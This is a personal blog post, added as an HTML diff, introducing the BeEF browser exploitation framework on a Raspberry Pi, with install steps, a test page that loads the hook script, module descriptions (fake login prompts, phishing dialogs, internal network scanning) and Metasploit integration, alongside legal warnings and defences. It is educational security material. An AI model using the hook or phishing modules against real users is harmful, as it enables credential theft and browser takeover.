@@ -1,0 +1,396 @@
+<!doctype html>
+<html lang="en-GB">
+  <head>
+
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <title>Dharun Ashokkumar: Getting Started with BeEF: The Browser Exploitation Framework</title>
+
+    <meta name="description" content="Introduction to BeEF pentesting tool for browser vulnerabilities. Learn about command server, JavaScript hooks, web interface, and ethical security testing on Raspberry Pi.">
+    <meta name="keywords" content="BeEF, Browser Exploitation Framework, pentesting, ethical hacking, Raspberry Pi security, browser vulnerabilities, security audits, Metasploit, Kali Linux, cybersecurity">
+    <meta name="author" content="Dharun Ashokkumar">
+
+    <!-- crawling/indexing by search engines -->
+    <meta name="robots" content="index,follow">
+
+    <link rel="icon" href="/assets/favicon.png">
+    <link rel="apple-touch-icon" href="/assets/favicon.png" type="image/png" />
+
+    <link rel="stylesheet" type="text/css" href='../css/styles.css'>
+    <!-- start: opengraph tags to make this page a rich-object -->
+      <meta property="og:type" content="website" />
+      <meta property="og:title" content="Getting Started with BeEF: The Browser Exploitation Framework">
+      <meta property="og:description" content="Introduction to BeEF pentesting tool for browser security testing.">
+      <meta property="og:url" content="https://dharunashokkumar.com/reflections/beef-raspberry-pi.html">
+      <meta property="og:site_name" content="Dharun Ashokkumar">
+    <!-- end: opengraph tags to make this page a rich-object -->
+  </head>
+  <body>
+    <div id="container" class="post"><div id="header">
+	<h1><a href="https://dharunashokkumar.com">Dharun Ashokkumar</a></h1><nav>
+	<ul><li>
+				<a href="/projects.html">projects</a>
+			</li><li>
+				<a href="/portfolio.html">portfolio</a>
+			</li><li>
+				<a href="/activities.html">activities</a>
+			</li><li>
+				<a href="/reflections.html">reflections</a>
+			</li></ul>
+</nav>
+</div><div id="content">
+        <h1 class="title">
+	<a href="/reflections/beef-raspberry-pi.html">Getting Started with BeEF: The Browser Exploitation Framework</a>
+</h1>
+
+<p class="post-meta">
+	<small>
+		<span class="date">2024</span>
+		<span class="categories"><em>filed under: </em>
+			<a href="/reflections.html">reflections</a></span>
+	</small>
+</p>
+
+<p>BeEF (Browser Exploitation Framework) is a powerful penetration testing tool that focuses on exploiting web browser vulnerabilities. Running it on my Raspberry Pi has given me hands-on experience with browser-based security testing and taught me valuable lessons about client-side attack vectors.</p>
+
+<h2>What is BeEF?</h2>
+
+<p>BeEF is an open-source penetration testing framework that demonstrates the security risks of browser-based attacks. Unlike traditional network exploitation tools, BeEF focuses on leveraging web browser vulnerabilities to assess the security posture of target environments.</p>
+
+<h3>Key Features</h3>
+
+<ul>
+<li><strong>JavaScript Hooks</strong>  Inject hooks into web browsers</li>
+<li><strong>Command & Control</strong>  Control hooked browsers remotely</li>
+<li><strong>Browser Fingerprinting</strong>  Detect browser type, version, plugins</li>
+<li><strong>Social Engineering</strong>  Demonstrate phishing and social engineering attacks</li>
+<li><strong>Network Discovery</strong>  Map internal networks from compromised browsers</li>
+<li><strong>Metasploit Integration</strong>  Combine with Metasploit for advanced attacks</li>
+</ul>
+
+<h2>How BeEF Works</h2>
+
+<h3>The Architecture</h3>
+
+<ol>
+<li><strong>BeEF Server</strong>  Command and control interface (web-based)</li>
+<li><strong>JavaScript Hook</strong>  Small script injected into target browser</li>
+<li><strong>Hooked Browser</strong>  Compromised browser maintaining connection to BeEF</li>
+<li><strong>Penetration Tester</strong>  Controls attack vectors through web UI</li>
+</ol>
+
+<h3>Attack Flow</h3>
+
+<pre><code>1. Target visits compromised or malicious website
+2. Browser executes BeEF hook JavaScript
+3. Browser "phones home" to BeEF server
+4. Attacker sees hooked browser in BeEF interface
+5. Attacker executes commands/modules on hooked browser
+6. Browser executes commands and reports results
+</code></pre>
+
+<h2>Installing BeEF on Raspberry Pi</h2>
+
+<h3>Prerequisites</h3>
+
+<ul>
+<li>Raspberry Pi 3 or 4 (2GB+ RAM recommended)</li>
+<li>Kali Linux or Raspberry Pi OS</li>
+<li>Internet connection for installation</li>
+<li>Basic Linux knowledge</li>
+</ul>
+
+<h3>Installation Steps</h3>
+
+<pre><code># Update system
+sudo apt update && sudo apt upgrade -y
+
+# Install dependencies
+sudo apt install curl git ruby ruby-dev libsqlite3-dev -y
+
+# Clone BeEF repository
+cd ~
+git clone https://github.com/beefproject/beef.git
+
+# Navigate to directory
+cd beef
+
+# Install Ruby gems
+sudo gem install bundler
+bundle install
+
+# Configure BeEF (optional)
+nano config.yaml
+</code></pre>
+
+<h3>Starting BeEF</h3>
+
+<pre><code>cd ~/beef
+./beef
+</code></pre>
+
+<p>Default credentials:</p>
+<ul>
+<li><strong>Username:</strong> beef</li>
+<li><strong>Password:</strong> beef</li>
+<li><strong>UI:</strong> http://localhost:3000/ui/panel</li>
+<li><strong>Hook URL:</strong> http://localhost:3000/hook.js</li>
+</ul>
+
+<p><strong>Important:</strong> Change default credentials immediately in production!</p>
+
+<h2>Basic Usage</h2>
+
+<h3>1. Access the Web Interface</h3>
+
+<p>Open browser and navigate to <code>http://[raspberry-pi-ip]:3000/ui/panel</code></p>
+
+<h3>2. Hook a Browser (Testing Environment)</h3>
+
+<p>Create a simple test page:</p>
+
+<pre><code>&lt;html&gt;
+&lt;head&gt;
+    &lt;title&gt;Test Page&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;h1&gt;Test Page&lt;/h1&gt;
+    &lt;script src="http://[your-pi-ip]:3000/hook.js"&gt;&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+
+<p>When you open this page, the browser will be hooked and appear in BeEF's UI.</p>
+
+<h3>3. Explore Browser Information</h3>
+
+<p>Once hooked, BeEF displays:</p>
+
+<ul>
+<li>Browser type and version</li>
+<li>Operating system</li>
+<li>Installed plugins</li>
+<li>Screen resolution</li>
+<li>Cookies</li>
+<li>Network details</li>
+</ul>
+
+<h3>4. Run Commands</h3>
+
+<p>BeEF provides various modules categorized by color:</p>
+
+<ul>
+<li><strong>Green</strong>  Works reliably, target unaware</li>
+<li><strong>Orange</strong>  Works but may alert user</li>
+<li><strong>Grey</strong>  Untested on this browser</li>
+<li><strong>Red</strong>  Unlikely to work</li>
+</ul>
+
+<h2>Common Use Cases</h2>
+
+<h3>1. Security Audits</h3>
+
+<p>Test organizational security awareness:</p>
+
+<ul>
+<li>Send test phishing emails with hooked pages</li>
+<li>Measure how many employees click malicious links</li>
+<li>Identify vulnerable browser configurations</li>
+<li>Assess effectiveness of security training</li>
+</ul>
+
+<h3>2. Developer Training</h3>
+
+<p>Educate web developers about:</p>
+
+<ul>
+<li>Cross-Site Scripting (XSS) dangers</li>
+<li>Importance of input validation</li>
+<li>Content Security Policy (CSP) implementation</li>
+<li>Secure coding practices</li>
+</ul>
+
+<h3>3. Research and Education</h3>
+
+<ul>
+<li>Study browser security models</li>
+<li>Understand attack vectors</li>
+<li>Learn defensive strategies</li>
+<li>Prepare for security certifications (CEH, OSCP)</li>
+</ul>
+
+<h2>Powerful BeEF Modules</h2>
+
+<h3>Browser Fingerprinting</h3>
+<p>Detect exact browser version, plugins, extensions, and system information.</p>
+
+<h3>Credential Harvesting</h3>
+<p>Display fake login prompts to capture credentials (demonstration purposes in controlled environments).</p>
+
+<h3>Social Engineering</h3>
+<p>Create convincing phishing scenarios:</p>
+<ul>
+<li>Fake software update prompts</li>
+<li>Browser plugin installation dialogs</li>
+<li>Security warning messages</li>
+</ul>
+
+<h3>Network Discovery</h3>
+<p>Use hooked browser to scan internal networks:</p>
+<ul>
+<li>Identify internal IP ranges</li>
+<li>Discover running services</li>
+<li>Map network topology</li>
+</ul>
+
+<h3>Clipboard Manipulation</h3>
+<p>Read or modify clipboard contents.</p>
+
+<h3>Webcam Access</h3>
+<p>Request permission to access webcam (requires user acceptance).</p>
+
+<h2>Integration with Metasploit</h2>
+
+<p>BeEF can work alongside Metasploit Framework:</p>
+
+<pre><code># In BeEF config.yaml, enable Metasploit
+metasploit:
+    enable: true
+    host: "127.0.0.1"
+    port: 55552
+</code></pre>
+
+<p>This allows:</p>
+<ul>
+<li>Browser exploits ’ System-level access</li>
+<li>Pivot from browser to network</li>
+<li>Deploy Meterpreter payloads</li>
+<li>Advanced post-exploitation</li>
+</ul>
+
+<h2>Ethical and Legal Considerations</h2>
+
+<p><strong>CRITICAL: Only use BeEF on systems you own or have explicit written permission to test.</strong></p>
+
+<h3>Legal Use Cases</h3>
+<ul>
+<li>Your own systems for learning</li>
+<li>Authorized penetration testing engagements</li>
+<li>Corporate security assessments with proper authorization</li>
+<li>Educational labs with isolated networks</li>
+</ul>
+
+<h3>Illegal Use Cases</h3>
+<ul>
+<li>Attacking systems without permission</li>
+<li>Unauthorized data theft</li>
+<li>Phishing real users without consent</li>
+<li>Any malicious activity</li>
+</ul>
+
+<p><strong>Violations can result in criminal prosecution under Computer Fraud and Abuse Act or equivalent laws in your country.</strong></p>
+
+<h2>Defensive Measures</h2>
+
+<p>Knowing BeEF helps you defend against it:</p>
+
+<h3>For Users</h3>
+<ul>
+<li>Keep browsers updated</li>
+<li>Don't click suspicious links</li>
+<li>Use script blockers (NoScript, uBlock Origin)</li>
+<li>Verify URL authenticity</li>
+<li>Use secure DNS</li>
+</ul>
+
+<h3>For Developers</h3>
+<ul>
+<li><strong>Implement Content Security Policy (CSP)</strong></li>
+<li><strong>Validate and sanitize all inputs</strong></li>
+<li><strong>Use X-Frame-Options header</strong></li>
+<li><strong>Enable HTTPS everywhere</strong></li>
+<li><strong>Regular security audits</strong></li>
+</ul>
+
+<h3>For Organizations</h3>
+<ul>
+<li>Deploy Web Application Firewalls (WAF)</li>
+<li>Conduct regular security awareness training</li>
+<li>Implement zero-trust network architecture</li>
+<li>Monitor for suspicious JavaScript execution</li>
+<li>Use browser isolation technologies</li>
+</ul>
+
+<h2>Running BeEF Securely</h2>
+
+<h3>Isolation</h3>
+<ul>
+<li>Run BeEF on isolated network segment</li>
+<li>Use VMs or containers</li>
+<li>Never expose to public internet</li>
+<li>Firewall rules restricting access</li>
+</ul>
+
+<h3>Configuration Hardening</h3>
+<ul>
+<li>Change default credentials</li>
+<li>Use strong passwords</li>
+<li>Enable HTTPS</li>
+<li>Restrict access by IP</li>
+<li>Regular updates</li>
+</ul>
+
+<h2>Lessons Learned</h2>
+
+<h3>Technical Insights</h3>
+<ul>
+<li>JavaScript can be weaponized in countless ways</li>
+<li>Browser security depends on user awareness</li>
+<li>Defense in depth is essential</li>
+<li>Client-side attacks are often overlooked</li>
+</ul>
+
+<h3>Professional Growth</h3>
+<ul>
+<li>Understanding attacker mindset improves defense</li>
+<li>Ethical hacking requires responsibility</li>
+<li>Documentation and authorization are paramount</li>
+<li>Continuous learning is essential in cybersecurity</li>
+</ul>
+
+<h2>Resources for Learning</h2>
+
+<ul>
+<li><strong>BeEF Project GitHub:</strong> github.com/beefproject/beef</li>
+<li><strong>BeEF Wiki:</strong> Comprehensive documentation</li>
+<li><strong>Kali Linux Documentation:</strong> BeEF usage in pentesting</li>
+<li><strong>OWASP:</strong> Web security fundamentals</li>
+<li><strong>HackerOne/BugCrowd:</strong> Practice ethical hacking</li>
+</ul>
+
+<h2>Conclusion</h2>
+
+<p>BeEF on Raspberry Pi is an excellent platform for learning browser-based penetration testing. The combination of accessible hardware and powerful software creates an affordable security research lab.</p>
+
+<p>However, with power comes responsibility. BeEF is a tool for security professionals, researchers, and learners. Use it ethically, legally, and responsibly. The knowledge you gain should be used to strengthen security, not compromise it.</p>
+
+<p>Understanding how attacks work is the first step in building effective defenses. Study, practice, protect.</p>
+
+      </div><div id="footer">
+	<h1><a href="https://dharunashokkumar.com">Dharun Ashokkumar</a></h1><nav>
+	<ul><li>
+				<a href="/projects.html">projects</a>
+			</li><li>
+				<a href="/portfolio.html">portfolio</a>
+			</li><li>
+				<a href="/activities.html">activities</a>
+			</li><li>
+				<a href="/reflections.html">reflections</a>
+			</li></ul>
+</nav>
+</div></div>
+    <script src="/assets/js/responsiveVideo.js"></script>
+    <script src="/assets/js/correctlyFloatMediaElementsLeftOrRight.js"></script>
+    </body>
+</html>
